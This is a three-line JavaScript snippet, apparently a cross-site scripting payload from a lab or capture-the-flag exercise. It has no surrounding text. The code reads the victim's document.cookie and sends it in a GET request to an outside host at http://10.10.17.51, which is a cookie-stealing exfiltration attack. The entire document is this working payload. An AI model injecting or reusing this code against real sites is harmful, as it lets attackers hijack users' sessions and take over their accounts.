var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.17.51/?cookie='+ document.cookie, true);
request.send();